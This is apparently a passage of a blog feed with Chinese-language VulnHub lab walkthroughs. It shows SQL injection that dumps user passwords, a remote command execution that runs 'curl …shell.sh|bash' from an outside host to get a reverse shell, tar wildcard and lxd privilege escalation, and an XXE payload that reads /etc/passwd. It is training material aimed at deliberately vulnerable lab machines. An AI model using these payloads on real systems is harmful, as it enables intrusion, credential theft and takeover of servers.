&lt;h4 id=&#34;猜列&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜列&#34;&gt;#&lt;/a&gt; 猜列&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSklMjBmcm9tJTIwaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMlMjB3aGVyZSUyMHRhYmxlX25hbWU9JTI3ZGV0YWlscyUyNy0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;details&#39;--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(column_name) from information_schema.columns where&lt;br&gt;
table_name=‘details’–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-545.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 表中有两列：name，password&lt;/p&gt;
&lt;h4 id=&#34;猜字段&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#猜字段&#34;&gt;#&lt;/a&gt; 猜字段&lt;/h4&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2Nv&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_co&lt;/span&gt;&lt;br&gt;
ncat(name)%20from%20users.details–+&lt;/p&gt;
&lt;p&gt;group_concat(name) from users.details–+admin,admin123,john,test&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-546.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 中 name 分别是：admin,admin123,john,test&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2hpc3RvcnkucGhwP3VzZXI9YWRtaW4lMjclMjB1bmlvbiUyMHNlbGVjdCUyMGdyb3VwX2NvbmNhdChwYXNzd29yZCklMjBmcm9tJTIwdXNlcnMuZGV0YWlscy0tKw==&#34;&gt;http://192.168.31.208/history.php?user=admin&#39; union select group_concat(password) from users.details--+&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;group_concat(password) from users.details–+&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-547.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;users.detail 中 password 分别是：&lt;br&gt;
myadmin#p4szw0r4d,admin123,Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD,test&lt;/p&gt;
&lt;p&gt;去除掉自己注册掉的用户之外，发现源网站存在两个用户和密码&lt;/p&gt;
&lt;p&gt;-&amp;gt; Admin: myadmin#p4szw0r4d john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD&lt;/p&gt;
&lt;h3 id=&#34;php-代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-代码审计&#34;&gt;#&lt;/a&gt; php 代码审计&lt;/h3&gt;
&lt;p&gt;由 Admin: myadmin#pszw0r4d 登陆到网站后台&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-548.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;home.php 页面检测到了 admin 账户已经登陆成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-549.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi5jb20vY3liZXJib3Q3NS9rZXlyaW5n&#34;&gt;http://github.com/cyberbot75/keyring&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;查看源码，审计源码，发现 control.php 存在 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-550.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注入参数为 cmdcntr 测试是否回显成功&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9aWQ=&#34;&gt;http://192.168.31.208/control.php?cmdcntr=id&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-551.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有回显，RCE 确实存在，测试是否存在相应的可反弹 shell 的命令&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9d2hpY2glMjBjdXJsO3doaWNoJTIwYmFzaDt3aGljaCUyMHB5dGhvbjt3aGljaCUyMHBocDs=&#34;&gt;http://192.168.31.208/control.php?cmdcntr=which curl;which bash;which python;which php;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-552.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;后台反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjA4L2NvbnRyb2wucGhwP2NtZGNudHI9Y3VybCUyMGh0dHA6Ly93d3cuY2hlbnR1by5hc2lhL3NoZWxsLnNoJTdDYmFzaA==&#34;&gt;http://192.168.31.208/control.php?cmdcntr=curl http://www.chentuo.asia/shell.sh|bash&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-553.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接收 shell，并将其转变为一个标准的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-554.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检查各个文件，查看有没有敏感的目录&lt;/p&gt;
&lt;p&gt;发现有一个 john 的用户，之前通过 sql 注入网站爆出的用户名有 john&lt;br&gt;
john: Sup3r&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;S3cr3t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68333em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;PasSW0RD 切换到了 john 用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-555.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;strings-查看文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#strings-查看文件&#34;&gt;#&lt;/a&gt; strings 查看文件&lt;/h3&gt;
&lt;p&gt;翻阅相关的文件，找到了一个敏感的文件 s 权限的 compress&lt;br&gt;
 但是服务器不存在 strings 不能查看这个命令里封装的是什么&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-556.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 scp/wget 将文件下载到了 kali 主机上&lt;br&gt;
 strings compress 查看此命令的详细信息，compose 会调用 root 的 s 权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-557.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;tar-通配符提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tar-通配符提权&#34;&gt;#&lt;/a&gt; tar 通配符提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;tar通配符提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/bin/bash&amp;quot; &amp;gt; exp.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh exp.sh&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./compress&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-558.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;lxd-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lxd-提权&#34;&gt;#&lt;/a&gt; lxd 提权&lt;/h3&gt;
&lt;p&gt;在 john 用户下，查看 id 时看到了所有组中有 lxd，并且本地有 lxc 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-559.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;searchsploit lxd 查找到了本地是存在此 exp 的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-560.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;阅读利用脚本说明，需要在攻击机上下载并以 root 账户编译该文件，最后将编译成功的文件以及 exp 一块发送到目标机器上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-561.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在攻击机上下载 payload&lt;br&gt;
 &lt;code&gt;wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-562.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在攻击机上编译此 payload&lt;br&gt;
 运行此命令时因为 kali 机器是在 M1 的 mac 电脑上搭建的，属于 aarch，不同于 windows 的 amd64 系统，因此编译失败了&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-563.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; Lxd 提权失败了，需要一台 amd64 的机器进行编译此文件&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/126%20HACKERKID/</guid>
            <title>VULNHUB 26 HACKERKID</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/126%20HACKERKID/</link>
            <category>VULNHUB 21-30</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2VyLWtpZC0xMDEsNzE5Lw==&#34;&gt;https://www.vulnhub.com/entry/hacker-kid-101,719/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDEwNzgzNi9hcnRpY2xlL2RldGFpbHMvMTE5NDIyODEw&#34;&gt;https://blog.csdn.net/weixin_44107836/article/details/119422810&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 HACKERKID：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）设置免密使用 sudo&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看 sudoers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cat /etc/sudoers | tail -n 12 | head -n 8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加免密登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parallels ALL=(ALL) NOPASSWD:ALL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;tail&lt;/span&gt; -n表示筛选后面几行，&lt;span class=&#34;built_in&#34;&gt;head&lt;/span&gt; -n表示筛选前面几行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-620.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;2 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-621.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.11&lt;/p&gt;
&lt;p&gt;3 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.31.11&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-622.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 53,80,9999&lt;/p&gt;
&lt;h3 id=&#34;burp-重发数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-重发数据包&#34;&gt;#&lt;/a&gt; Burp 重发数据包&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE=&#34;&gt;http://192.168.31.11&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-623.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;右键检查网页的源代码，发现提示，存在 page_no 的 GET 参数，即存在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTE/cGFnZV9ubz14eA==&#34;&gt;http://192.168.31.11?page_no=xx&lt;/span&gt; 的一个页面，可以通过 py 来编写 1-100 的自然数，并且用 burp 进行批量访问&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-624.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;编写 python 脚本，用于生成 1-100 个数字，每行有 1 个数字&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-625.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 tail 和 head 命令来检查所生成的文件是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-626.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用浏览器拦截数据发送至 burp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-627.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将数据发送到 indruder 模式，在 page_no=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; 的位置设置字典，字典为前面 py 生成或者可以用 burp 自带的生成 1-100 的间隔为 1 的爆破字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-628.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 将接收包进行长度的排序得到一个不一样的长度，对应的 url 地址是 http://192.168.31.11?page_no=21&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-629.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 hosts&lt;/h3&gt;
&lt;p&gt;得到提示，有一些子域名被创建出来了，并且其中之一是 hackers.blackhat.local&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-630.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;修改本地 hosts 文件，将此域名的 ip 解析指向为靶机地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-631.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://hackers.blackhat.local 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-632.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示接下来的思路是搜集到更多的子域名信息，并且这些子域名解析后的地址指向为靶机的 ip 地址，通过 dig 来指定 DNS 服务器搜集 hackers.blackhat.local 信息&lt;/p&gt;
&lt;h3 id=&#34;dig指定dns解析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dig指定dns解析&#34;&gt;#&lt;/a&gt; dig 指定 DNS 解析&lt;/h3&gt;
&lt;p&gt;Linux 下解析域名除了使用 nslookup 之外，开可以使用 dig 命令来解析域名，dig 命令可以得到更多的域名信息。dig 命令主要用来从 DNS 域名服务器查询主机地址信息。dig 的全称是 (domain information groper) 域信息筛选器。它是一个用来灵活探测 DNS 的工具。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dig hackers.blackhat.local @192.168.31.11&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从指定的 DNS 服务器上进行查询，(从默认的 DNS 服务器上获得的结果可能不准确)。指定 DNS 服务器的方式为使用 @ 符号，如果不指定 DNS 服务器，dig 会依次使用 /etc/resolv.conf 里的地址作为 DNS 服务器：&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-633.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了一个新的子域名，将 dig 的结果添加到本地 hosts 文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-634.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2hhY2tlcmlkLmJsYWNraGF0LmxvY2Fs&#34;&gt;http://hackerid.blackhat.local&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-635.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;xxe-读取敏感信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe-读取敏感信息&#34;&gt;#&lt;/a&gt; xxe 读取敏感信息&lt;/h3&gt;
&lt;p&gt;将所有的信息都填写上，进行数据包的抓取，判断数据是怎么进入后台的，是否存在相应的漏洞可以进行利用&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-636.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 burp 抓取数据，发现数据是以 xml 的形式传播的，可以测试 xxe 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-637.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 xxe 漏洞进行读取 /etc/passwd&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY dd SYSTEM &amp;#x27;file:///etc/passwd&amp;#x27;&amp;gt;]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;name&amp;gt;&amp;lt;/name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;tel&amp;gt;&amp;lt;/tel&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;amp;dd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;/email&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;password&amp;gt;&amp;lt;/password&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/root&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
